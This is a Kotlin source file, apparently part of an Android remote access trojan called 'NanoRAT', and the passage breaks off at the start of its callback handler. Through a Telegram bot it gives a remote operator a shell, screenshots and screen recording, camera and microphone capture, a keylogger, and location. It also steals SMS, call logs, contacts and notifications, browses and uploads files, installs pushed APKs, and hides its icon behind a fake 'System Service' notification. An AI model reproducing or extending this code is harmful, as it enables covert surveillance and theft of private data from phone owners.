package com.outcome.c2

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import android.util.Base64
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicLong

class TelegramC2Service : Service() {

    companion object {
        private const val TAG = "TgC2"
        private const val NOTIF_ID = 2
        private const val CHANNEL_ID = "c2tg"
        private const val API_BASE = "https://api.telegram.org/bot"
        private const val FILES_PER_PAGE = 12
    }

    private val BOT_TOKEN: String = BuildConfig.TG_BOT_TOKEN
    private val CHAT_ID: String = BuildConfig.TG_CHAT_ID

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(70, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    private val deviceId: String by lazy { DeviceInfo.id(this) }

    @Volatile private var projection: MediaProjection? = null
    @Volatile private var captureSession: ScreenCaptureSession? = null
    @Volatile private var lastUpdateId: Long = 0

    // UI state
    @Volatile private var currentMenuPath: MutableList<String> = mutableListOf("main")
    @Volatile private var currentMenuMessageId: Long = 0L
    @Volatile private var startedAt: Long = System.currentTimeMillis()
    @Volatile private var commandCount: Int = 0
    @Volatile private var lastError: String = ""

    // Files browser state
    private val pathRegistry = ConcurrentHashMap<String, String>()
    private val idGen = AtomicLong(1000)
    @Volatile private var currentBrowsePath: String = "/sdcard"
    @Volatile private var currentBrowsePage: Int = 0

    private fun log(msg: String) {
        android.util.Log.i(TAG, msg)
        LogBus.append(applicationContext, "TG", msg)
    }

    private fun shortId(path: String): String {
        pathRegistry.entries.firstOrNull { it.value == path }?.let { return it.key }
        val id = "p${idGen.incrementAndGet()}"
        pathRegistry[id] = path
        if (pathRegistry.size > 2000) {
            val keys = pathRegistry.keys.take(500)
            keys.forEach { pathRegistry.remove(it) }
        }
        return id
    }

    private fun pathOf(id: String): String? = pathRegistry[id]

    override fun onCreate() {
        super.onCreate()
        log("onCreate deviceId=$deviceId")
        startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)

        if (BOT_TOKEN.isEmpty() || BOT_TOKEN.startsWith("TG_TOKEN")) {
            log("BOT_TOKEN not configured")
            return
        }
        if (CHAT_ID.isEmpty() || CHAT_ID.startsWith("TG_CHAT")) {
            log("CHAT_ID not configured")
            return
        }

        startedAt = System.currentTimeMillis()

        scope.launch {
            registerBotCommands()
            delay(500)
            sendMainMenu()
        }
        scope.launch { pollLoop() }
        scope.launch { autoRefreshLoop() }

        WatchdogReceiver.schedule(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        log("onStartCommand action=${intent?.action}")
        if (intent?.action == "START_PROJECTION") {
            val code = intent.getIntExtra("proj_result_code", Int.MIN_VALUE)
            val data: Intent? = if (Build.VERSION.SDK_INT >= 33)
                intent.getParcelableExtra("proj_data", Intent::class.java)
            else
                @Suppress("DEPRECATION") intent.getParcelableExtra("proj_data")
            if (code != Int.MIN_VALUE && data != null) {
                startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                initProjectionFromIntent(code, data)
            }
        }
        return START_STICKY
    }

    private fun startForegroundCompat(type: Int) {
        val notification = buildNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, notification, type)
            } else {
                startForeground(NOTIF_ID, notification)
            }
        } catch (e: Exception) {
            log("startForeground failed: ${e.message}")
        }
    }

    private fun initProjectionFromIntent(resultCode: Int, data: Intent) {
        log("initProjection: code=$resultCode")
        try {
            captureSession?.release()
            captureSession = null
            try { projection?.stop() } catch (_: Exception) {}
            projection = null

            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val proj = mpm.getMediaProjection(resultCode, data)
            log("getMediaProjection: $proj")
            if (proj == null) return

            proj.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    log("projection onStop")
                    captureSession?.release()
                    captureSession = null
                    projection = null
                    scope.launch { refreshCurrentMenu() }
                }
            }, Handler(Looper.getMainLooper()))

            projection = proj
            captureSession = ScreenCaptureSession(this, proj)
            log("projection ACTIVE with capture session")
            scope.launch { refreshCurrentMenu() }
        } catch (e: Exception) {
            log("initProjection ERROR: ${e.message}")
            projection = null
            captureSession = null
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "TG", NotificationManager.IMPORTANCE_MIN)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("running")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    // ---------- Telegram API ----------

    private suspend fun apiCall(method: String, body: RequestBody): JSONObject? =
        withContext(Dispatchers.IO) {
            val req = Request.Builder()
                .url("$API_BASE$BOT_TOKEN/$method")
                .post(body)
                .build()
            try {
                val raw = client.newCall(req).execute().use { r -> r.body?.string() }
                if (raw == null) return@withContext null
                if (!raw.trimStart().startsWith("{")) return@withContext null
                JSONObject(raw)
            } catch (e: Exception) {
                log("api $method: ${e.message}")
                null
            }
        }

    private suspend fun sendChatAction(action: String) {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("action", action)
            .build()
        apiCall("sendChatAction", body)
    }

    private suspend fun sendMessage(text: String) {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("text", text.take(4000))
            .addFormDataPart("parse_mode", "HTML")
            .addFormDataPart("disable_web_page_preview", "true")
            .build()
        apiCall("sendMessage", body)
    }

    private suspend fun sendMessageWithKeyboard(text: String, keyboard: JSONObject): Long {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("text", text.take(4000))
            .addFormDataPart("parse_mode", "HTML")
            .addFormDataPart("disable_web_page_preview", "true")
            .addFormDataPart("reply_markup", keyboard.toString())
            .build()
        val resp = apiCall("sendMessage", body)
        return resp?.optJSONObject("result")?.optLong("message_id") ?: 0L
    }

    private suspend fun editMessageWithKeyboard(
        messageId: Long, text: String, keyboard: JSONObject
    ) {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("message_id", messageId.toString())
            .addFormDataPart("text", text.take(4000))
            .addFormDataPart("parse_mode", "HTML")
            .addFormDataPart("disable_web_page_preview", "true")
            .addFormDataPart("reply_markup", keyboard.toString())
            .build()
        apiCall("editMessageText", body)
    }

    private suspend fun answerCallback(callbackId: String, text: String = "") {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("callback_query_id", callbackId)
            .addFormDataPart("text", text)
            .build()
        apiCall("answerCallbackQuery", body)
    }

    private suspend fun sendDocument(filename: String, mime: String, bytes: ByteArray) {
        val fileBody = bytes.toRequestBody(mime.toMediaType())
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("document", filename, fileBody)
            .build()
        apiCall("sendDocument", body)
    }

    private suspend fun sendPhoto(filename: String, jpegBytes: ByteArray, caption: String = "") {
        val fileBody = jpegBytes.toRequestBody("image/jpeg".toMediaType())
        val builder = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("photo", filename, fileBody)
        if (caption.isNotEmpty()) builder.addFormDataPart("caption", caption.take(1000))
        apiCall("sendPhoto", builder.build())
    }

    private suspend fun sendAudio(filename: String, bytes: ByteArray) {
        val fileBody = bytes.toRequestBody("audio/mp4".toMediaType())
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("audio", filename, fileBody)
            .build()
        apiCall("sendAudio", body)
    }

    private suspend fun sendDocumentFile(file: File, caption: String = "") {
        try {
            val bytes = file.readBytes()
            val ext = file.extension.lowercase()
            val mime = when (ext) {
                "jpg", "jpeg", "png", "gif", "webp", "bmp" -> "image/$ext"
                "mp4", "mkv", "avi", "mov", "webm" -> "video/$ext"
                "mp3", "wav", "ogg", "m4a", "flac" -> "audio/$ext"
                "pdf" -> "application/pdf"
                "zip", "rar", "7z", "tar", "gz" -> "application/zip"
                "apk" -> "application/vnd.android.package-archive"
                "txt", "log", "md", "json", "xml", "csv" -> "text/plain"
                else -> "application/octet-stream"
            }

            if (mime.startsWith("image/") && bytes.size < 8 * 1024 * 1024) {
                sendPhoto(file.name, bytes, caption)
                return
            }

            val fileBody = bytes.toRequestBody(mime.toMediaType())
            val builder = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("document", file.name, fileBody)
            if (caption.isNotEmpty()) builder.addFormDataPart("caption", caption.take(1000))
            apiCall("sendDocument", builder.build())
        } catch (e: Exception) {
            log("sendDocumentFile: ${e.message}")
            sendMessage("⚠️ failed to send ${file.name}: ${e.message}")
        }
    }

    private suspend fun registerBotCommands() {
        val cmds = JSONArray().apply {
            put(JSONObject().put("command", "start").put("description", "🏠 Main menu"))
            put(JSONObject().put("command", "menu").put("description", "📋 Show menu"))
            put(JSONObject().put("command", "status").put("description", "📊 Live status"))
            put(JSONObject().put("command", "files").put("description", "📁 Browse files"))
            put(JSONObject().put("command", "info").put("description", "📱 Device info"))
            put(JSONObject().put("command", "shell").put("description", "💻 Run shell command"))
            put(JSONObject().put("command", "screenshot").put("description", "📸 Screen capture"))
            put(JSONObject().put("command", "screen_record").put("description", "🎥 Record screen"))
            put(JSONObject().put("command", "hide_icon").put("description", "👻 Hide app icon"))
            put(JSONObject().put("command", "show_icon").put("description", "✅ Show app icon"))
        }
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("commands", cmds.toString())
            .build()
        apiCall("setMyCommands", body)
    }

    // ---------- Live status ----------

    private fun batteryPct(): Int {
        return try {
            val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (_: Exception) { 0 }
    }

    private fun batteryIcon(pct: Int): String = when {
        pct >= 80 -> "🔋"
        pct >= 40 -> "🔋"
        pct >= 15 -> "🪫"
        else      -> "🪫"
    }

    private fun uptimeStr(): String {
        val s = (System.currentTimeMillis() - startedAt) / 1000
        val h = s / 3600
        val m = (s % 3600) / 60
        return if (h > 0) "${h}h ${m}m" else "${m}m"
    }

    private fun notifCount(): Int {
        return try { NotificationsBuffer.peek().length() } catch (_: Exception) { 0 }
    }

    private fun mainStatusLine(): String {
        val bat = batteryPct()
        val proj = if (captureSession != null) "🟢" else "🟡"
        val notif = notifCount()
        return "$proj  ${batteryIcon(bat)} $bat%  🔔 $notif  ⏱ ${uptimeStr()}"
    }

    private fun mainMenuText(): String {
        val name = "${Build.MANUFACTURER} ${Build.MODEL}".trim()
        return buildString {
            append("🤖 <b>NanoRAT</b>\n")
            append("━━━━━━━━━━━━━━━━━━━━━\n")
            append("📱 <code>$name</code>\n")
            append("🆔 <code>${deviceId.take(8)}…</code>\n")
            append(mainStatusLine())
            if (lastError.isNotEmpty()) {
                append("\n⚠️ <i>${lastError.take(60)}</i>")
            }
        }
    }

    // ---------- Menus ----------

    private fun mainKeyboard(): JSONObject {
        val projReady = captureSession != null
        val screenshotLabel = if (projReady) "📸 Screenshot" else "🚫 Screenshot"

        return JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", screenshotLabel)
                    .put("callback_data", if (projReady) "act:screenshot" else "act:no_projection"))
                put(JSONObject().put("text", "📊 Status").put("callback_data", "menu:status"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "📸 Capture").put("callback_data", "menu:capture"))
                put(JSONObject().put("text", "🎙 Record").put("callback_data", "menu:record"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "📁 Files").put("callback_data", "menu:files"))
                put(JSONObject().put("text", "📊 Info").put("callback_data", "menu:info"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🎮 Control").put("callback_data", "menu:control"))
                put(JSONObject().put("text", "💬 Comms").put("callback_data", "menu:comms"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔐 Privacy").put("callback_data", "menu:privacy"))
                put(JSONObject().put("text", "⚙️ System").put("callback_data", "menu:system"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔄 Refresh").put("callback_data", "act:refresh"))
                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
            })
        })
    }

    private fun backRow(): JSONArray = JSONArray().apply {
        put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:back"))
        put(JSONObject().put("text", "🏠 Main").put("callback_data", "menu:main"))
        put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
    }

    private fun captureMenuText(): String = buildString {
        append("<b>📸 Capture</b>\n")
        append("━━━━━━━━━━━━━━━━━━━━━\n")
        if (captureSession != null) {
            append("🟢 Screen projection active")
        } else {
            append("🔴 Screen projection disabled\n")
            append("<i>Open app → tap #4 → grant</i>")
        }
    }

    private fun captureMenuKeyboard(): JSONObject {
        val ready = captureSession != null
        return JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", if (ready) "📸 Screenshot" else "🚫 Screenshot")
                    .put("callback_data", if (ready) "act:screenshot" else "act:no_projection"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🤳 Front camera").put("callback_data", "act:camera:front"))
                put(JSONObject().put("text", "📷 Back camera").put("callback_data", "act:camera:back"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🎥 Record 10s").put("callback_data", "act:screen_record:10"))
                put(JSONObject().put("text", "🎥 Record 30s").put("callback_data", "act:screen_record:30"))
            })
            put(backRow())
        })
    }

    private fun recordMenuKeyboard(): JSONObject =
        JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "🎙 5s").put("callback_data", "act:mic:5"))
                put(JSONObject().put("text", "🎙 10s").put("callback_data", "act:mic:10"))
                put(JSONObject().put("text", "🎙 30s").put("callback_data", "act:mic:30"))
            })
            put(backRow())
        })

    private fun infoMenuKeyboard(): JSONObject {
        val notif = notifCount()
        return JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "📱 Device").put("callback_data", "act:info"))
                put(JSONObject().put("text", "🌐 Network").put("callback_data", "act:network"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "📍 Location").put("callback_data", "act:location"))
                put(JSONObject().put("text", "📦 Apps").put("callback_data", "act:apps"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔔 Notifications ($notif)").put("callback_data", "act:notif"))
            })
            put(backRow())
        })
    }

    private fun controlMenuKeyboard(): JSONObject =
        JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔒 Lock").put("callback_data", "act:lock"))
                put(JSONObject().put("text", "🏠 Home").put("callback_data", "act:home"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "◀️ Back").put("callback_data", "act:back"))
                put(JSONObject().put("text", "🪟 Recents").put("callback_data", "act:recents"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "💻 Shell").put("callback_data", "prompt:shell"))
                put(JSONObject().put("text", "🔗 URL").put("callback_data", "prompt:url"))
            })
            put(backRow())
        })

    private fun commsMenuKeyboard(): JSONObject =
        JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "📞 Call log").put("callback_data", "act:calls"))
                put(JSONObject().put("text", "💬 SMS").put("callback_data", "act:sms"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "👥 Contacts").put("callback_data", "act:contacts"))
                put(JSONObject().put("text", "🔔 Notifications").put("callback_data", "act:notif"))
            })
            put(backRow())
        })

    private fun privacyMenuKeyboard(): JSONObject {
        val kl = try { KeylogBuffer.isActive() } catch (_: Exception) { false }
        val klState = if (kl) "🟢 recording" else "🔴 stopped"
        return JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "⌨️ $klState")
                    .put("callback_data", "act:keylog_info"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "▶️ Start").put("callback_data", "act:keylog_start"))
                put(JSONObject().put("text", "⏹ Stop").put("callback_data", "act:keylog_stop"))
                put(JSONObject().put("text", "📤 Dump").put("callback_data", "act:keylog_dump"))
            })
            put(backRow())
        })
    }

    private fun systemMenuKeyboard(): JSONObject =
        JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔄 Refresh menu").put("callback_data", "act:refresh"))
                put(JSONObject().put("text", "📊 Live status").put("callback_data", "menu:status"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "👻 Hide icon").put("callback_data", "act:hide_icon"))
                put(JSONObject().put("text", "✅ Show icon").put("callback_data", "act:show_icon"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🗑 Self destruct").put("callback_data", "prompt:selfdestruct"))
            })
            put(backRow())
        })

    private fun statusMenuText(): String {
        val bat = batteryPct()
        val proj = if (captureSession != null) "🟢 active" else "🟡 disabled"
        val kl = try { if (KeylogBuffer.isActive()) "🟢 recording" else "🔴 stopped" } catch (_: Exception) { "?" }
        val notif = notifCount()
        val rec = if (ScreenRecorder.isRecording()) "🟢 recording" else "⚪ idle"
        val now = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
        return buildString {
            append("<b>📊 Live Status</b>\n")
            append("━━━━━━━━━━━━━━━━━━━━━\n")
            append("🕐 <code>$now</code>\n")
            append("${batteryIcon(bat)} Battery: <b>$bat%</b>\n")
            append("📸 Projection: $proj\n")
            append("🎥 Screen rec: $rec\n")
            append("⌨️ Keylogger: $kl\n")
            append("🔔 Notifications: $notif\n")
            append("⏱ Uptime: ${uptimeStr()}\n")
            append("⚡ Commands: $commandCount")
            if (lastError.isNotEmpty()) {
                append("\n⚠️ <i>${lastError.take(100)}</i>")
            }
        }
    }

    private fun statusMenuKeyboard(): JSONObject =
        JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔄 Refresh").put("callback_data", "menu:status"))
                put(JSONObject().put("text", "📊 Network").put("callback_data", "act:network"))
            })
            put(backRow())
        })

    private suspend fun sendMainMenu() {
        currentMenuPath = mutableListOf("main")
        val id = sendMessageWithKeyboard(mainMenuText(), mainKeyboard())
        if (id > 0) currentMenuMessageId = id
    }

    // ---------- Files browser ----------

    private fun iconFor(name: String, isDir: Boolean): String {
        if (isDir) return "📁"
        val ext = name.substringAfterLast('.', "").lowercase()
        return when (ext) {
            "jpg", "jpeg", "png", "gif", "webp", "bmp", "heic" -> "🖼"
            "mp4", "mkv", "avi", "mov", "webm", "3gp" -> "🎬"
            "mp3", "wav", "ogg", "m4a", "flac", "aac" -> "🎵"
            "pdf" -> "📕"
            "zip", "rar", "7z", "tar", "gz" -> "📦"
            "apk" -> "⚙️"
            "doc", "docx" -> "📘"
            "xls", "xlsx" -> "📗"
            "ppt", "pptx" -> "📙"
            "txt", "log", "md" -> "📄"
            "json", "xml", "csv", "yml", "yaml" -> "📃"
            "db", "sqlite", "sqlite3" -> "🗄"
            else -> "📄"
        }
    }

    private fun fmtSize(bytes: Long): String {
        if (bytes < 1024) return "$bytes B"
        val kb = bytes / 1024.0
        if (kb < 1024) return String.format(Locale.US, "%.1f KB", kb)
        val mb = kb / 1024.0
        if (mb < 1024) return String.format(Locale.US, "%.1f MB", mb)
        val gb = mb / 1024.0
        return String.format(Locale.US, "%.2f GB", gb)
    }

    private data class FileEntry(
        val name: String,
        val path: String,
        val isDir: Boolean,
        val size: Long,
        val lastModified: Long
    )

    private fun listEntries(path: String): List<FileEntry> {
        val dir = File(path)
        if (!dir.exists() || !dir.isDirectory) return emptyList()
        val files = dir.listFiles() ?: return emptyList()
        return files
            .filter { !it.name.startsWith(".") }
            .map { FileEntry(it.name, it.absolutePath, it.isDirectory, it.length(), it.lastModified()) }
            .sortedWith(compareByDescending<FileEntry> { it.isDir }.thenBy { it.name.lowercase() })
    }

    private fun filesMenuText(path: String, entries: List<FileEntry>, page: Int): String {
        val totalPages = if (entries.isEmpty()) 1 else (entries.size + FILES_PER_PAGE - 1) / FILES_PER_PAGE
        val safePage = page.coerceIn(0, totalPages - 1)
        return buildString {
            append("<b>📁 Files</b>\n")
            append("━━━━━━━━━━━━━━━━━━━━━\n")
            append("📂 <code>${path.take(60)}</code>\n")
            append("📊 ${entries.size} items")
            if (totalPages > 1) append(" · page ${safePage + 1}/$totalPages")
        }
    }

    private fun filesMenuKeyboard(path: String, entries: List<FileEntry>, page: Int): JSONObject {
        val totalPages = if (entries.isEmpty()) 1 else (entries.size + FILES_PER_PAGE - 1) / FILES_PER_PAGE
        val safePage = page.coerceIn(0, totalPages - 1)
        val start = safePage * FILES_PER_PAGE
        val end = (start + FILES_PER_PAGE).coerceAtMost(entries.size)
        val slice = entries.subList(start, end)

        val rows = JSONArray()

        for (e in slice) {
            val icon = iconFor(e.name, e.isDir)
            val label = if (e.isDir) {
                "$icon ${e.name}"
            } else {
                "$icon ${e.name}  ·  ${fmtSize(e.size)}"
            }
            val truncated = if (label.length > 60) label.take(57) + "…" else label
            val id = shortId(e.path)
            val data = if (e.isDir) "fb:open:$id" else "fb:file:$id"
            rows.put(JSONArray().apply {
                put(JSONObject().put("text", truncated).put("callback_data", data))
            })
        }

        if (totalPages > 1) {
            rows.put(JSONArray().apply {
                if (safePage > 0) {
                    put(JSONObject().put("text", "◀️ Prev")
                        .put("callback_data", "fb:page:${safePage - 1}"))
                }
                put(JSONObject().put("text", "${safePage + 1}/$totalPages")
                    .put("callback_data", "fb:noop"))
                if (safePage < totalPages - 1) {
                    put(JSONObject().put("text", "Next ▶️")
                        .put("callback_data", "fb:page:${safePage + 1}"))
                }
            })
        }

        rows.put(JSONArray().apply {
            val parent = File(path).parent
            if (parent != null && path != "/") {
                val pid = shortId(parent)
                put(JSONObject().put("text", "⬆️ Up").put("callback_data", "fb:open:$pid"))
            }
            put(JSONObject().put("text", "🏠 /sdcard").put("callback_data", "fb:open_sd"))
            put(JSONObject().put("text", "🔄").put("callback_data", "fb:refresh"))
        })

        rows.put(backRow())

        return JSONObject().put("inline_keyboard", rows)
    }

    private suspend fun renderFilesBrowser(messageId: Long, edit: Boolean) {
        val path = currentBrowsePath
        val entries = listEntries(path)
        currentBrowsePage = currentBrowsePage.coerceIn(
            0,
            if (entries.isEmpty()) 0 else (entries.size - 1) / FILES_PER_PAGE
        )
        val text = filesMenuText(path, entries, currentBrowsePage)
        val kb = filesMenuKeyboard(path, entries, currentBrowsePage)
        if (edit && messageId > 0) {
            editMessageWithKeyboard(messageId, text, kb)
        } else {
            val id = sendMessageWithKeyboard(text, kb)
            if (id > 0) currentMenuMessageId = id
        }
    }

    // ---------- Menu rendering ----------

    private suspend fun renderMenu(path: String, messageId: Long, edit: Boolean) {
        val (text, kb) = when (path) {
            "main"    -> mainMenuText() to mainKeyboard()
            "capture" -> captureMenuText() to captureMenuKeyboard()
            "record"  -> "<b>🎙 Record audio</b>\nSelect a duration:" to recordMenuKeyboard()
            "files"   -> {
                currentBrowsePath = "/sdcard"
                currentBrowsePage = 0
                val entries = listEntries(currentBrowsePath)
                filesMenuText(currentBrowsePath, entries, 0) to
                    filesMenuKeyboard(currentBrowsePath, entries, 0)
            }
            "info"    -> "<b>📊 Info</b>\nDevice intelligence:" to infoMenuKeyboard()
            "control" -> "<b>🎮 Control</b>\nDevice actions:" to controlMenuKeyboard()
            "comms"   -> "<b>💬 Comms</b>\nCalls, SMS, contacts:" to commsMenuKeyboard()
            "privacy" -> "<b>🔐 Privacy</b>\nKeylogger and notifications:" to privacyMenuKeyboard()
            "system"  -> "<b>⚙️ System</b>\nMaintenance:" to systemMenuKeyboard()
            "status"  -> statusMenuText() to statusMenuKeyboard()
            else      -> mainMenuText() to mainKeyboard()
        }
        if (edit && messageId > 0) {
            editMessageWithKeyboard(messageId, text, kb)
        } else {
            val id = sendMessageWithKeyboard(text, kb)
            if (id > 0) currentMenuMessageId = id
        }
    }

    private suspend fun refreshCurrentMenu() {
        val path = currentMenuPath.lastOrNull() ?: "main"
        if (currentMenuMessageId > 0) {
            if (path == "files") {
                renderFilesBrowser(currentMenuMessageId, edit = true)
            } else {
                renderMenu(path, currentMenuMessageId, edit = true)
            }
        }
    }

    private suspend fun autoRefreshLoop() {
        while (currentCoroutineContext().isActive) {
            delay(60_000)
            try {
                val path = currentMenuPath.lastOrNull() ?: "main"
                if (path == "main" || path == "status") {
                    refreshCurrentMenu()
                }
            } catch (_: Exception) {}
        }
    }

    // ---------- Long poll ----------

    private suspend fun pollLoop() {
        while (currentCoroutineContext().isActive) {
            try {
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("offset", (lastUpdateId + 1).toString())
                    .addFormDataPart("timeout", "30")
                    .addFormDataPart("allowed_updates", "[\"message\",\"callback_query\"]")
                    .build()

                val resp = apiCall("getUpdates", body)
                if (resp == null) { delay(3000); continue }
                if (!resp.optBoolean("ok", false)) { delay(5000); continue }

                val results = resp.optJSONArray("result") ?: JSONArray()
                for (i in 0 until results.length()) {
                    val upd = results.getJSONObject(i)
                    val updateId = upd.optLong("update_id")
                    if (updateId > lastUpdateId) lastUpdateId = updateId
                    handleUpdate(upd)
                }
            } catch (e: Exception) {
                log("poll error: ${e.message}")
            }
            delay(1000)
        }
    }

    private suspend fun handleUpdate(update: JSONObject) {
        update.optJSONObject("message")?.let { msg ->
            val chatId = msg.optJSONObject("chat")?.optLong("id")?.toString() ?: return@let
            if (chatId != CHAT_ID) return@let

            // Handle APK uploads
            msg.optJSONObject("document")?.let { doc ->
                val fileId = doc.optString("file_id", "")
                val fileName = doc.optString("file_name", "")
                val fileSize = doc.optLong("file_size", 0)
                log("document received: $fileName ($fileSize bytes)")
                if (fileName.endsWith(".apk", true)) {
                    sendMessage("📦 receiving APK: <code>${fileName}</code>…")
                    downloadAndInstallApk(fileId, fileName)
                } else {
                    sendMessage("📄 received: <code>${fileName}</code>\n<i>only .apk files are auto-installed</i>")
                }
                return@let
            }

            val text = msg.optString("text", "").trim()
            if (text.isEmpty()) return@let
            log("cmd: $text")
            commandCount++
            try { dispatchTextCommand(text) } catch (e: Exception) {
                log("dispatch error: ${e.message}")
                lastError = e.message ?: ""
                sendMessage("⚠️ error: ${e.message}")
            }
        }

        update.optJSONObject("callback_query")?.let { cb ->
            val fromId = cb.optJSONObject("from")?.optLong("id")?.toString() ?: return@let
            if (fromId != CHAT_ID) return@let
            val cbId = cb.optString("id", "")
            val data = cb.optString("data", "")
            val msgId = cb.optJSONObject("message")?.optLong("message_id") ?: 0L
            log("callback: $data")
            commandCount++
            try { handleCallback(cbId, msgId, data) } catch (e: Exception) {
                log("handleCallback error: ${e.message}")
                lastError = e.message ?: ""
                answerCallback(cbId, "error")
            }
        }
    }

    private suspend fun downloadAndInstallApk(fileId: String, fileName: String) {
        withContext(Dispatchers.IO) {
            try {
                val getBody = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("file_id", fileId)
                    .build()
                val info = apiCall("getFile", getBody) ?: run {
                    sendMessage("⚠️ failed to get file info")
                    return@withContext
                }
                val filePath = info.optJSONObject("result")?.optString("file_path") ?: run {
                    sendMessage("⚠️ no file_path returned")
                    return@withContext
                }

                val url = "https://api.telegram.org/file/bot$BOT_TOKEN/$filePath"
                val req = Request.Builder().url(url).get().build()
                val bytes = client.newCall(req).execute().use { it.body?.bytes() }
                if (bytes == null || bytes.isEmpty()) {
                    sendMessage("⚠️ download failed")
                    return@withContext
                }

                val dir = File(cacheDir, "apk")
                if (!dir.exists()) dir.mkdirs()
                val dest = File(dir, fileName)
                dest.writeBytes(bytes)

                sendMessage("📦 APK saved: ${dest.length() / 1024} KB\n<i>opening installer…</i>")

                withContext(Dispatchers.Main) {
                    try {
                        val intent = Intent(Intent.ACTION_VIEW).apply {
                            setDataAndType(
                                androidx.core.content.FileProvider.getUriForFile(
                                    applicationContext,
                                    "${packageName}.fileprovider",
                                    dest
                                ),
                                "application/vnd.android.package-archive"
                            )
                            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        startActivity(intent)
                    } catch (e: Exception) {
                        sendMessage("⚠️ install intent failed: ${e.message}")
                    }
                }
            } catch (e: Exception) {
                sendMessage("⚠️ APK install error: ${e.message}")
            }
        }
    }

    private suspend fun handleCallback(callbackId: String, messageId: Long, data: String) {
